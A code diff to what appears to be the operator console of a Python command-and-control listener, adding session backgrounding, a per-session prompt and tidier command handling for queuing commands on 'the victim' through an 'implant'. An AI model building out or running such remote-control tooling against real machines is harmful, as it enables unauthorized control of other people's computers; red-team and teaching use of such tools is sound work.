@@ -249,33 +249,19 @@ def selectSession(choice):
     # select session
     while CURRENT_SESSION == "none":
         sessionChoice = choice
+        validSession = False
+        print(sessionChoice)
         for i, session in enumerate(SESSIONS):
             if sessionChoice == session.get_info('ID') or (sessionChoice.isdigit() and int(sessionChoice) == i):
                 CURRENT_SESSION = session.get_info('Address')
                 print(f"Selected session: {session.get_info('ID')}")
+                validSession = True
                 break
-            else:
-                sessionChoice = ""
-                print("Please select a valid session.")
+        break
+    if not validSession:
+        print("Invalid Session selected.")
 
 def input_thread():
-    printHeader()
-    portSet = False
-    customPort = ""
-    
-
-    while portSet == False:
-        customPort = input("Enter a port number to listen on or leave blank to use default (1337): ")
-        if customPort.strip() == "":
-            PORT = 1337
-            portSet = True
-        elif not customPort.isdigit():
-            print("Port must be an integer!!")
-        else:
-            PORT = customPort
-            portSet = True
-        
-    print(f"Starting listener on port: {PORT}!")
 
     global global_lock
     global_lock = False
@@ -294,11 +280,12 @@ def input_thread():
 
         global CURRENT_SESSION
 
-        while selection == "":
+        while selection == "" and CURRENT_SESSION == "none":
+            
             selection = input("$ ")
             if selection.strip() == "sessions":
                 # list sessions
-                if CURRENT_SESSION == "none" and len(SESSIONS) != 0:
+                if len(SESSIONS) != 0:
                     listSessions()
                     selection = ""
                 else:
@@ -324,16 +311,23 @@ def input_thread():
                 # You're welcome :)
                 os.system(f"kill {os.getpid()}")
                 while True: pass
+            elif selection == "clear" or selection == "cls":
+                clearScreen()
+            elif selection.strip() != "":
+                print("Invalid command.")
             else:
-                print("Please enter a valid command.")
                 selection = ""
-
+        sessionid = ''
         if global_connection and CURRENT_SESSION != "none":
-            new_cmd = input("$ ").lower()
+            for session in SESSIONS:
+                if session.get_info('Address') == CURRENT_SESSION:
+                    sessionid = session.get_info('ID')
+            new_cmd = input(f"[{bcolors.OKBLUE + sessionid + bcolors.ENDC}] - $ ").lower()
         #help
         if new_cmd == "help":
             print("""Run a command on the victim or
     - use \"getpid\" to get the process ID of the implant.
+    - use \"back\" to background the session.
     - use \"kill\" to kill the implant.
     - use \"history\" to view command history.
     - use \"clear\" to clear the screen
@@ -354,7 +348,7 @@ def input_thread():
                 for cmd in CMD_QUEUE:
                     print("  " + cmd)
         #exit
-        elif new_cmd == "exit":
+        elif new_cmd.strip() == "exit" or new_cmd.strip() == "quit":
             print("Exitting...")
             # You're welcome :)
             os.system(f"kill {os.getpid()}")
@@ -364,14 +358,36 @@ def input_thread():
             printHeader()
         elif new_cmd == "clear" or new_cmd == "cls":
             clearScreen()
+        elif new_cmd.strip() == "back" or new_cmd.strip() == "background":
+            print(f"Backgrounded Session: {sessionid}.")
+            CURRENT_SESSION = "none"
         #execute command on victim
         elif new_cmd.strip() != "":
             CMD_QUEUE.append(new_cmd)
             HISTORY_INDEX = len(CMD_HISTORY)
+        
         #commands queued up
         if len(CMD_QUEUE) > 1:
             print(f"Added '{new_cmd}' to queue...")
 
+
+printHeader()
+portSet = False
+customPort = ""
+
+
+while portSet == False:
+    customPort = input("Enter a port number to listen on or leave blank to use default (1337): ")
+    if customPort.strip() == "":
+        PORT = 1337
+        portSet = True
+    elif not customPort.isdigit():
+        print("Port must be an integer!!")
+    else:
+        PORT = customPort
+        portSet = True
+    
+print(f"Starting listener on port: {PORT}!")
 
 threading.Thread(target = input_thread).start()
 if __name__ == "__main__":
